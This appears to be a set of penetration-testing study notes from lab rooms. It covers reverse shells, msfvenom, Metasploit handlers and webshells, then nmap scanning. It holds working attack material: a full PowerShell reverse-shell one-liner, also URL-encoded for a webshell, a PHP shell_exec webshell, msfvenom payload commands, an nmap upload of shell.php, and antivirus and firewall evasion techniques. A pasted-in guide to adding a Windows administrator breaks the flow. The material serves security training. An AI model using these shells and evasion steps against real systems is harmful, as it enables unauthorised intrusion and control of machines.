<p>powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</p>
<p>In order to use this, we need to replace &quot;<IP>&quot; and &quot;<port>&quot; with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:</p>
<p>For other common reverse shell payloads, PayloadsAllTheThings is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.</p>
<p>Msfvenom: the one-stop-shop for all things payload related.</p>
<p>Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.</p>
<p>The standard syntax for msfvenom is as follows:</p>
<p>msfvenom -p <PAYLOAD> <OPTIONS></p>
<p>For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:</p>
<p>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port></p>
<p>Here we are using a payload and four options:
-f <format>
Specifies the output format. In this case that is an executable (exe)
-o <file>
The output location and filename for the generated payload.
LHOST=<IP>
Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
LPORT=<port>
The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
Staged vs Stageless</p>
<p>Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.</p>
<p>Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.</p>
<p>Meterpreter</p>
<p>On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they must be caught in Metasploit.</p>
<p>Payload Naming Conventions</p>
<p>When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:</p>
<p><OS>/<arch>/<payload></p>
<p>For example:</p>
<p>linux/x86/shell_reverse_tcp</p>
<p>This would generate a stageless reverse shell for an x86 Linux target.</p>
<p>The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:</p>
<p>windows/shell_reverse_tcp</p>
<p>For a 64bit Windows target, the arch would be specified as normal (x64).</p>
<p>Let's break the payload section down a little further.</p>
<p>In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:
shell/reverse_tcp</p>
<p>As staged payloads are denoted with another forward slash (/).</p>
<p>This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:</p>
<p>windows/x64/meterpreter/reverse_tcp</p>
<p>A Linux 32bit stageless Meterpreter payload would look like this:</p>
<p>linux/x86/meterpreter_reverse_tcp</p>
<p>Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:</p>
<p>msfvenom --list payloads</p>
<p>This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads. For example:</p>
<p>This gives us a full set of Linux meterpreter payloads for 32bit targets.</p>
<p>Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.</p>
<p>Fortunately, it's relatively easy to use:</p>
<p>Open Metasploit with msfconsole
Type use multi/handler, and press enter
We are now primed to start a multi/handler session. Let's take a look at the available options using the options command:</p>
<p>There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your tun0 address). We set these options with the following commands:</p>
<p>set PAYLOAD <payload>
set LHOST <listen-address>
set LPORT <listen-port>
We should now be ready to start the listener!</p>
<p>Let's do this by using the exploit -j command. This tells Metasploit to launch the module, running as a job in the background.</p>
<p>You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit must be run with sudo permissions.</p>
<p>When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:</p>
<p>Notice that, because the multi/handler was originally backgrounded, we needed to use sessions 1 to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions <number> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see &quot;Command Shell session 1 opened&quot;).</p>
<p>There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell. See the Upload Vulnerabilities Room for a more extensive look at this concept.</p>
<p>&quot;Webshell&quot; is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.</p>
<p>As PHP is still the most common server side scripting language, let's have a look at some simple code for this.</p>
<p>In a very basic one line format:</p>
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
<p>This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The &quot;pre&quot; elements are to ensure that the results are formatted correctly on the page.</p>
<p>Let's see this in action:</p>
<p>Notice that when navigating the shell, we used a GET parameter &quot;cmd&quot; with the command &quot;ifconfig&quot;, which correctly returned the network information of the box. In other words, by entering the ifconfig command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. whoami, hostname, arch, etc).</p>
<p>As mentioned previously, there are a variety of webshells available on Kali by default at /usr/share/webshells -- including the infamous PentestMonkey php-reverse-shell -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.</p>
<p>When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:</p>
<p>powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</p>
<p>This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.</p>
<p>Here's how to add a user and assign them administrator privileges from the command line in Windows:</p>
<p><strong>1. Open Command Prompt as Administrator:</strong></p>
<ul>
<li>Press the <strong>Windows key + X</strong> and select <strong>Command Prompt (Admin)</strong>.</li>
<li>Alternatively, search for &quot;cmd&quot; in the Start menu, right-click on &quot;Command Prompt,&quot; and choose &quot;Run as administrator.&quot;</li>
</ul>
<p><strong>2. Create the User:</strong></p>
<p>Use the following command, replacing <code>username</code> with your desired username and <code>password</code> with a strong password (enclose the password in quotes if it contains spaces):</p>
<pre><code>net user username password /add
</code></pre>
<p><strong>Example:</strong></p>
<pre><code>net user newuser &quot;StrongP@ssword123&quot; /add
</code></pre>
<p><strong>3. Add User to Administrators Group:</strong></p>
<p>Use this command, replacing <code>username</code> with the username you just created:</p>
<pre><code>net localgroup administrators username /add
</code></pre>
<p><strong>Example:</strong></p>
<pre><code>net localgroup administrators newuser /add
</code></pre>
<p><strong>Verification (Optional):</strong></p>
<ul>
<li>To verify user creation, use:</li>
</ul>
<pre><code>net user
</code></pre>
<ul>
<li>To confirm the user is added to the Administrators group, use:</li>
</ul>
<pre><code>net localgroup administrators
</code></pre>
<p><strong>Important Notes:</strong></p>
<ul>
<li><strong>Granting Administrator Privileges:</strong> Be cautious when assigning administrator privileges. Users with administrative access can make significant changes to the system configuration, potentially leading to security risks.</li>
<li><strong>Password Strength:</strong> Choose a strong password for the new user account. It should be at least 12 characters long and include a mix of uppercase and lowercase letters, numbers, and symbols. </li>
<li><strong>Alternative Methods:</strong> You can also create and manage users through the built-in Computer Management tool or the Settings app (search for &quot;Add, edit, or remove users&quot;).</li>

<p>When it comes to hacking, knowledge is power. The more knowledge you have about a target system or network, the more options you have available. This makes it imperative that proper enumeration is carried out before any exploitation attempts are made.</p>
<p>Say we have been given an IP (or multiple IP addresses) to perform a security audit on. Before we do anything else, we need to get an idea of the “landscape” we are attacking. What this means is that we need to establish which services are running on the targets. For example, perhaps one of them is running a webserver, and another is acting as a Windows Active Directory Domain Controller. The first stage in establishing this “map” of the landscape is something called port scanning. When a computer runs a network service, it opens a networking construct called a “port” to receive the connection.  Ports are necessary for making multiple network requests or having multiple services available. For example, when you load several webpages at once in a web browser, the program must have some way of determining which tab is loading which web page. This is done by establishing connections to the remote webservers using different ports on your local machine. Equally, if you want a server to be able to run more than one service (for example, perhaps you want your webserver to run both HTTP and HTTPS versions of the site), then you need some way to direct the traffic to the appropriate service. Once again, ports are the solution to this. Network connections are made between two ports – an open port listening on the server and a randomly selected port on your own computer. For example, when you connect to a web page, your computer may open port 49534 to connect to the server’s port 443.</p>
<p>As in the previous example, the diagram shows what happens when you connect to numerous websites at the same time. Your computer opens up a different, high-numbered port (at random), which it uses for all its communications with the remote server.</p>
<p>Every computer has a total of 65535 available ports; however, many of these are registered as standard ports. For example, a HTTP Webservice can nearly always be found on port 80 of the server. A HTTPS Webservice can be found on port 443. Windows NETBIOS can be found on port 139 and SMB can be found on port 445. It is important to note; however, that especially in a CTF setting, it is not unheard of for even these standard ports to be altered, making it even more imperative that we perform appropriate enumeration on the target.</p>
<p>If we do not know which of these ports a server has open, then we do not have a hope of successfully attacking the target; thus, it is crucial that we begin any attack with a port scan. This can be accomplished in a variety of ways – usually using a tool called nmap, which is the focus of this room. Nmap can be used to perform many different kinds of port scan – the most common of these will be introduced in upcoming tasks; however, the basic theory is this: nmap will connect to each port of the target in turn. Depending on how the port responds, it can be determined as being open, closed, or filtered (usually by a firewall). Once we know which ports are open, we can then look at enumerating which services are running on each port – either manually, or more commonly using nmap.</p>
<p>So, why nmap? The short answer is that it's currently the industry standard for a reason: no other port scanning tool comes close to matching its functionality (although some newcomers are now matching it for speed). It is an extremely powerful tool – made even more powerful by its scripting engine which can be used to scan for vulnerabilities, and in some cases even perform the exploit directly! Once again, this will be covered more in upcoming tasks.</p>
<p>For now, it is important that you understand: what port scanning is; why it is necessary; and that nmap is the tool of choice for any kind of initial enumeration.</p>
<p>Like most pentesting tools, nmap is run from the terminal. There are versions available for both Windows and Linux. For this room we will assume that you are using Linux; however, the switches should be identical. Nmap is installed by default in both Kali Linux and the TryHackMe Attack Box.</p>
<p>Nmap can be accessed by typing nmap into the terminal command line, followed by some of the &quot;switches&quot; (command arguments which tell a program to do different things) we will be covering below.</p>
<p>All you'll need for this is the help menu for nmap (accessed with nmap -h) and/or the nmap man page (access with man nmap). For each answer, include all parts of the switch unless otherwise specified. This includes the hyphen at the start (-).</p>
<p>When port scanning with Nmap, there are three basic scan types. These are:</p>
<p>TCP Connect Scans (-sT)
SYN &quot;Half-open&quot; Scans (-sS)
UDP Scans (-sU)
Additionally there are several less common port scan types, some of which we will also cover (albeit in less detail). These are:</p>
<p>TCP Null Scans (-sN)
TCP FIN Scans (-sF)
TCP Xmas Scans (-sX)
Most of these (with the exception of UDP scans) are used for very similar purposes, however, the way that they work differs between each scan. This means that, whilst one of the first three scans are likely to be your go-to in most situations, it's worth bearing in mind that other scan types exist.</p>
<p>In terms of network scanning, we will also look briefly at ICMP (or &quot;ping&quot;) scanning.</p>
<p>To understand TCP Connect scans (-sT), it's important that you're comfortable with the TCP three-way handshake. If this term is new to you then completing Introductory Networking before continuing would be advisable.</p>
<p>As a brief recap, the three-way handshake consists of three stages. First the connecting terminal (our attacking machine, in this instance) sends a TCP request to the target server with the SYN flag set. The server then acknowledges this packet with a TCP response containing the SYN flag, as well as the ACK flag. Finally, our terminal completes the handshake by sending a TCP request with the ACK flag set.</p>
<p>This is one of the fundamental principles of TCP/IP networking, but how does it relate to Nmap?</p>
<p>Well, as the name suggests, a TCP Connect scan works by performing the three-way handshake with each target port in turn. In other words, Nmap tries to connect to each specified TCP port, and determines whether the service is open by the response it receives.</p>
<p>For example, if a port is closed, RFC 9293 states that:</p>
<p>&quot;... If the connection does not exist (CLOSED), then a reset is sent in response to any incoming segment except another reset. A SYN segment that does not match an existing connection is rejected by this means.&quot;</p>
<p>In other words, if Nmap sends a TCP request with the SYN flag set to a closed port, the target server will respond with a TCP packet with the RST (Reset) flag set. By this response, Nmap can establish that the port is closed.</p>
<p>If, however, the request is sent to an open port, the target will respond with a TCP packet with the SYN/ACK flags set. Nmap then marks this port as being open (and completes the handshake by sending back a TCP packet with ACK set).</p>
<p>This is all well and good, however, there is a third possibility.</p>
<p>What if the port is open, but hidden behind a firewall?</p>
<p>Many firewalls are configured to simply drop incoming packets. Nmap sends a TCP SYN request, and receives nothing back. This indicates that the port is being protected by a firewall and thus the port is considered to be filtered.</p>
<p>That said, it is very easy to configure a firewall to respond with a RST TCP packet. For example, in IPtables for Linux, a simple version of the command would be as follows:</p>
<p>iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset</p>
<p>This can make it extremely difficult (if not impossible) to get an accurate reading of the target(s).</p>
<p>As with TCP scans, SYN scans (-sS) are used to scan the TCP port-range of a target or targets; however, the two scan types work slightly differently. SYN scans are sometimes referred to as &quot;Half-open&quot; scans, or &quot;Stealth&quot; scans.</p>
<p>Where TCP scans perform a full three-way handshake with the target, SYN scans sends back a RST TCP packet after receiving a SYN/ACK from the server (this prevents the server from repeatedly trying to make the request). In other words, the sequence for scanning an open port looks like this:</p>
<p>This has a variety of advantages for us as hackers:</p>
<p>It can be used to bypass older Intrusion Detection systems as they are looking out for a full three way handshake. This is often no longer the case with modern IDS solutions; it is for this reason that SYN scans are still frequently referred to as &quot;stealth&quot; scans.
SYN scans are often not logged by applications listening on open ports, as standard practice is to log a connection once it's been fully established. Again, this plays into the idea of SYN scans being stealthy.
Without having to bother about completing (and disconnecting from) a three-way handshake for every port, SYN scans are significantly faster than a standard TCP Connect scan.
There are, however, a couple of disadvantages to SYN scans, namely:</p>
<p>They require sudo permissions[1] in order to work correctly in Linux. This is because SYN scans require the ability to create raw packets (as opposed to the full TCP handshake), which is a privilege only the root user has by default.
Unstable services are sometimes brought down by SYN scans, which could prove problematic if a client has provided a production environment for the test.
All in all, the pros outweigh the cons.</p>
<p>For this reason, SYN scans are the default scans used by Nmap if run with sudo permissions. If run without sudo permissions, Nmap defaults to the TCP Connect scan we saw in the previous task.</p>
<p>When using a SYN scan to identify closed and filtered ports, the exact same rules as with a TCP Connect scan apply.</p>
<p>If a port is closed then the server responds with a RST TCP packet. If the port is filtered by a firewall then the TCP SYN packet is either dropped, or spoofed with a TCP reset.</p>
<p>In this regard, the two scans are identical: the big difference is in how they handle open ports.</p>
<p>[1] SYN scans can also be made to work by giving Nmap the CAP_NET_RAW, CAP_NET_ADMIN and CAP_NET_BIND_SERVICE capabilities; however, this may not allow many of the NSE scripts to run properly.</p>
<p>Unlike TCP, UDP connections are stateless. This means that, rather than initiating a connection with a back-and-forth &quot;handshake&quot;, UDP connections rely on sending packets to a target port and essentially hoping that they make it. This makes UDP superb for connections which rely on speed over quality (e.g. video sharing), but the lack of acknowledgement makes UDP significantly more difficult (and much slower) to scan. The switch for an Nmap UDP scan is (-sU)</p>
<p>When a packet is sent to an open UDP port, there should be no response. When this happens, Nmap refers to the port as being open|filtered. In other words, it suspects that the port is open, but it could be firewalled. If it gets a UDP response (which is very unusual), then the port is marked as open. More commonly there is no response, in which case the request is sent a second time as a double-check. If there is still no response then the port is marked open|filtered and Nmap moves on.</p>
<p>When a packet is sent to a closed UDP port, the target should respond with an ICMP (ping) packet containing a message that the port is unreachable. This clearly identifies closed ports, which Nmap marks as such and moves on.</p>
<p>Due to this difficulty in identifying whether a UDP port is actually open, UDP scans tend to be incredibly slow in comparison to the various TCP scans (in the region of 20 minutes to scan the first 1000 ports, with a good connection). For this reason it's usually good practice to run an Nmap scan with --top-ports <number> enabled. For example, scanning with  nmap -sU --top-ports 20 <target>. Will scan the top 20 most commonly used UDP ports, resulting in a much more acceptable scan time.</p>
<p>When scanning UDP ports, Nmap usually sends completely empty requests -- just raw UDP packets. That said, for ports which are usually occupied by well-known services, it will instead send a protocol-specific payload which is more likely to elicit a response from which a more accurate result can be drawn.</p>
<p>NULL, FIN and Xmas TCP port scans are less commonly used than any of the others we've covered already, so we will not go into a huge amount of depth here. All three are interlinked and are used primarily as they tend to be even stealthier, relatively speaking, than a SYN &quot;stealth&quot; scan. Beginning with NULL scans:</p>
<p>As the name suggests, NULL scans (-sN) are when the TCP request is sent with no flags set at all. As per the RFC, the target host should respond with a RST if the port is closed.</p>
<p>FIN scans (-sF) work in an almost identical fashion; however, instead of sending a completely empty packet, a request is sent with the FIN flag (usually used to gracefully close an active connection). Once again, Nmap expects a RST if the port is closed.</p>
<p>As with the other two scans in this class, Xmas scans (-sX) send a malformed TCP packet and expects a RST response for closed ports. It's referred to as an xmas scan as the flags that it sets (PSH, URG and FIN) give it the appearance of a blinking christmas tree when viewed as a packet capture in Wireshark.</p>
<p>The expected response for open ports with these scans is also identical, and is very similar to that of a UDP scan. If the port is open then there is no response to the malformed packet. Unfortunately (as with open UDP ports), that is also an expected behaviour if the port is protected by a firewall, so NULL, FIN and Xmas scans will only ever identify ports as being open|filtered, closed, or filtered. If a port is identified as filtered with one of these scans then it is usually because the target has responded with an ICMP unreachable packet.</p>
<p>It's also worth noting that while RFC 793 mandates that network hosts respond to malformed packets with a RST TCP packet for closed ports, and don't respond at all for open ports; this is not always the case in practice. In particular Microsoft Windows (and a lot of Cisco network devices) are known to respond with a RST to any malformed TCP packet -- regardless of whether the port is actually open or not. This results in all ports showing up as being closed.</p>
<p>That said, the goal here is, of course, firewall evasion. Many firewalls are configured to drop incoming TCP packets to blocked ports which have the SYN flag set (thus blocking new connection initiation requests). By sending requests which do not contain the SYN flag, we effectively bypass this kind of firewall. Whilst this is good in theory, most modern IDS solutions are savvy to these scan types, so don't rely on them to be 100% effective when dealing with modern systems.</p>
<p>On first connection to a target network in a black box assignment, our first objective is to obtain a &quot;map&quot; of the network structure -- or, in other words, we want to see which IP addresses contain active hosts, and which do not.</p>
<p>One way to do this is by using Nmap to perform a so called &quot;ping sweep&quot;. This is exactly as the name suggests: Nmap sends an ICMP packet to each possible IP address for the specified network. When it receives a response, it marks the IP address that responded as being alive. For reasons we'll see in a later task, this is not always accurate; however, it can provide something of a baseline and thus is worth covering.</p>
<p>To perform a ping sweep, we use the -sn switch in conjunction with IP ranges which can be specified with either a hypen (-) or CIDR notation. i.e. we could scan the 192.168.0.x network using:</p>
<p>nmap -sn 192.168.0.1-254
or</p>
<p>nmap -sn 192.168.0.0/24</p>
<p>The -sn switch tells Nmap not to scan any ports -- forcing it to rely primarily on ICMP echo packets (or ARP requests on a local network, if run with sudo or directly as the root user) to identify targets. In addition to the ICMP echo requests, the -sn switch will also cause nmap to send a TCP SYN packet to port 443 of the target, as well as a TCP ACK (or TCP SYN if not run as root) packet to port 80 of the target.</p>
<p>The Nmap Scripting Engine (NSE) is an incredibly powerful addition to Nmap, extending its functionality quite considerably. NSE Scripts are written in the Lua programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them. The NSE is particularly useful for reconnaisance, however, it is well worth bearing in mind how extensive the script library is.</p>
<p>There are many categories available. Some useful categories include:</p>
<p>safe:- Won't affect the target
intrusive:- Not safe: likely to affect the target
vuln:- Scan for vulnerabilities
exploit:- Attempt to exploit a vulnerability
auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
brute:- Attempt to bruteforce credentials for running services
discovery:- Attempt to query running services for further information about the network (e.g. query an SNMP server).
A more exhaustive list can be found here.</p>
<p>In the next task we'll look at how to interact with the NSE and make use of the scripts in these categories.</p>
<p>In Task 3 we looked very briefly at the --script switch for activating NSE scripts from the vuln category using --script=vuln. It should come as no surprise that the other categories work in exactly the same way. If the command --script=safe is run, then any applicable safe scripts will be run against the target (Note: only scripts which target an active service will be activated).</p>
<p>To run a specific script, we would use --script=<script-name>  , e.g. --script=http-fileupload-exploiter.</p>
<p>Multiple scripts can be run simultaneously in this fashion by separating them by a comma. For example: --script=smb-enum-users,smb-enum-shares.</p>
<p>Some scripts require arguments (for example, credentials, if they're exploiting an authenticated vulnerability). These can be given with the --script-args Nmap switch. An example of this would be with the http-put script (used to upload files using the PUT method). This takes two arguments: the URL to upload the file to, and the file's location on disk.  For example:</p>
<p>nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'</p>
<p>Note that the arguments are separated by commas, and connected to the corresponding script with periods (i.e.  <script-name>.<argument>).</p>
<p>A full list of scripts and their corresponding arguments (along with example use cases) can be found here.</p>
<p>Nmap scripts come with built-in help menus, which can be accessed using nmap --script-help <script-name>. This tends not to be as extensive as in the link given above, however, it can still be useful when working locally.</p>
<p>Ok, so we know how to use the scripts in Nmap, but we don't yet know how to find these scripts.</p>
<p>We have two options for this, which should ideally be used in conjunction with each other. The first is the page on the Nmap website (mentioned in the previous task) which contains a list of all official scripts. The second is the local storage on your attacking machine. Nmap stores its scripts on Linux at /usr/share/nmap/scripts. All of the NSE scripts are stored in this directory by default -- this is where Nmap looks for scripts when you specify them.</p>
<p>There are two ways to search for installed scripts. One is by using the /usr/share/nmap/scripts/script.db file. Despite the extension, this isn't actually a database so much as a formatted text file containing filenames and categories for each available script.</p>
<p>Nmap uses this file to keep track of (and utilise) scripts for the scripting engine; however, we can also grep through it to look for scripts. For example: grep &quot;ftp&quot; /usr/share/nmap/scripts/script.db.</p>
<p>The second way to search for scripts is quite simply to use the ls command. For example, we could get the same results as in the previous screenshot by using ls -l /usr/share/nmap/scripts/<em>ftp</em>:</p>
<p>Note the use of asterisks (*) on either side of the search term</p>
<p>The same techniques can also be used to search for categories of script. For example:
grep &quot;safe&quot; /usr/share/nmap/scripts/script.db</p>
<p>Installing New Scripts</p>
<p>We mentioned previously that the Nmap website contains a list of scripts, so, what happens if one of these is missing in the scripts directory locally? A standard sudo apt update &amp;&amp; sudo apt install nmap should fix this; however, it's also possible to install the scripts manually by downloading the script from Nmap (sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse). This must then be followed up with nmap --script-updatedb, which updates the script.db file to contain the newly downloaded script.</p>
<p>It's worth noting that you would require the same &quot;updatedb&quot; command if you were to make your own NSE script and add it into Nmap -- a more than manageable task with some basic knowledge of Lua!</p>
<p>We have already seen some techniques for bypassing firewalls (think stealth scans, along with NULL, FIN and Xmas scans); however, there is another very common firewall configuration which it's imperative we know how to bypass.</p>
<p>Your typical Windows host will, with its default firewall, block all ICMP packets. This presents a problem: not only do we often use ping to manually establish the activity of a target, Nmap does the same thing by default. This means that Nmap will register a host with this firewall configuration as dead and not bother scanning it at all.</p>
<p>So, we need a way to get around this configuration. Fortunately Nmap provides an option for this: -Pn, which tells Nmap to not bother pinging the host before scanning it. This means that Nmap will always treat the target host(s) as being alive, effectively bypassing the ICMP block; however, it comes at the price of potentially taking a very long time to complete the scan (if the host really is dead then Nmap will still be checking and double checking every specified port).</p>
<p>It's worth noting that if you're already directly on the local network, Nmap can also use ARP requests to determine host activity.</p>
<p>There are a variety of other switches which Nmap considers useful for firewall evasion. We will not go through these in detail, however, they can be found here.</p>
<p>The following switches are of particular note:</p>
<p>-f:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
An alternative to -f, but providing more control over the size of the packets: --mtu <number>, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
--scan-delay <time>ms:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
--badsum:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.</p>

<p>Nmap’s default behaviour is to use reverse-DNS online hosts. Because the hostnames can reveal a lot, this can be a helpful step. However, if you don’t want to send such DNS queries, you use -n to skip this step.</p>
<p>By default, Nmap will look up online hosts; however, you can use the option -R to query the DNS server even for offline hosts. If you want to use a specific DNS server, you can add the --dns-servers DNS_SERVER option.</p>
<p>You have learned how ARP, ICMP, TCP, and UDP can detect live hosts by completing this room. Any response from a host is an indication that it is online. Below is a quick summary of the command-line options for Nmap that we have covered.</p>

<p>In the same sense that an IP address specifies a host on a network among many others, a TCP port or UDP port is used to identify a network service running on that host. A server provides the network service, and it adheres to a specific network protocol. Examples include providing time, responding to DNS queries, and serving web pages. A port is usually linked to a service using that specific port number. For instance, an HTTP server would bind to TCP port 80 by default; moreover, if the HTTP server supports SSL/TLS, it would listen on TCP port 443. (TCP ports 80 and 443 are the default ports for HTTP and HTTPS; however, the webserver administrator might choose other port numbers if necessary.) Furthermore, no more than one service can listen on any TCP or UDP port (on the same IP address).</p>
<p>At the risk of oversimplification, we can classify ports in two states:</p>
<p>Open port indicates that there is some service listening on that port.
Closed port indicates that there is no service listening on that port.
However, in practical situations, we need to consider the impact of firewalls. For instance, a port might be open, but a firewall might be blocking the packets. Therefore, Nmap considers the following six states:</p>
<ul>
<li>Open: indicates that a service is listening on the specified port.</li>
<li>Closed: indicates that no service is listening on the specified port, although the port is accessible. By accessible, we mean that it is reachable and is not blocked by a firewall or other security appliances/programs.</li>
<li>Filtered: means that Nmap cannot determine if the port is open or closed because the port is not accessible. This state is usually due to a firewall preventing Nmap from reaching that port. Nmap’s packets may be blocked from reaching the port; alternatively, the responses are blocked from reaching Nmap’s host.</li>
<li>Unfiltered: means that Nmap cannot determine if the port is open or closed, although the port is accessible. This state is encountered when using an ACK scan -sA.</li>
<li>Open|Filtered: This means that Nmap cannot determine whether the port is open or filtered.</li>
<li>Closed|Filtered: This means that Nmap cannot decide whether a port is closed or filtered.</li>
</ul>
<p>In particular, we need to focus on the flags that Nmap can set or unset. We have highlighted the TCP flags in red. Setting a flag bit means setting its value to 1. From left to right, the TCP header flags are:</p>
<ol>
<li>URG: Urgent flag indicates that the urgent pointer filed is significant. The urgent pointer indicates that the incoming data is urgent, and that a </li>
<li>TCP segment with the URG flag set is processed immediately without consideration of having to wait on previously sent TCP segments.</li>
<li>ACK: Acknowledgement flag indicates that the acknowledgement number is significant. It is used to acknowledge the receipt of a TCP segment.</li>
<li>PSH: Push flag asking TCP to pass the data to the application promptly.</li>
<li>RST: Reset flag is used to reset the connection. Another device, such as a firewall, might send it to tear a TCP connection. This flag is also used when data is sent to a host and there is no service on the receiving end to answer.</li>
<li>SYN: Synchronize flag is used to initiate a TCP 3-way handshake and synchronize sequence numbers with the other host. The sequence number should be set randomly during TCP connection establishment.</li>
<li>FIN: The sender has no more data to send.</li>
</ol>
<p>We are interested in learning whether the TCP port is open, not establishing a TCP connection. Hence the connection is torn as soon as its state is confirmed by sending a RST/ACK. You can choose to run TCP connect scan using -sT.</p>
